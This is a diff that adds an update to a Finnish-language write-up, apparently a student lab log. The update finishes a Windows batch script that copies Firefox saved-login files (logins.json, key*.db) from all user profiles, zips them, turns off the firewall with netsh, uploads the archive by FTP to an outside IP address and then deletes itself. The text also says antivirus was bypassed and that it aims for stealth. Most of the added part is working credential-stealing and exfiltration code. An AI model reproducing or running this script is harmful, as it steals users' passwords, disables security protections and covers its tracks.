@@ -161,7 +161,41 @@ Puhtaalla koneella ajettaessa palomuuri kysyi kuitenkin yhteyden avauksen yhteyd
 Virustorjunnoista kumpikaan ei kuitenkaan valittanut tästä scriptistä yhtään, vaan antoivat sen mennä läpi sellaisenaan. Eli virustorjunnan ohitus on onnistunut.  
 Jatkan vielä tutkimista miten tuon palomuurin promptin saisi estettyä, jotta ohjelma pysyisi stealthimpana.  
 
+### Päivitys 24.10.2018
 
+#### Palomuuri promptin ohitus.
+Palomuuri promptin ohitus olikin melko yksinkertainen.  
+Käytin .batissa vain palomuurin sulkemiskomentoa:
+```
+netsh advfirewall set allprofiles state off
+```
+Käytin komentoa juuri ennen kuin ftp yhteys avataan ja kun tiedosto on lähetetty, niin laitan palomuurin takaisin päälle komennolla:
+```
+netsh advfirewall set allprofiles state on
+```
+  
+Kokonaisuudessaan toimiva .bat näyttää nyt siis tältä:
+```
+mkdir C:\salasanat\
+powershell Copy-Item -Path C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\logins.json -Destination C:\salasanat\
+powershell Copy-Item -Path C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\key*.db -Destination C:\salasanat\
+powershell Compress-Archive -Path C:\salasanat -DestinationPath C:\salasanat\salasanat.zip
+@echo off
+echo open 172.28.171.247> temp.txt
+echo anonymous>> temp.txt
+echo asd >> temp.txt
+echo cd salasanat>> temp.txt
+echo quote pasv>> temp.txt
+echo binary>> temp.txt
+echo send C:\salasanat\salasanat.zip>> temp.txt
+echo quit>> temp.txt
+netsh advfirewall set allprofiles state off
+ftp -s:temp.txt
+netsh advfirewall set allprofiles state on
+del temp.txt
+del varas.bat
+```
+Pientä hiomista vielä vaaditaan lisää.
 
 
 
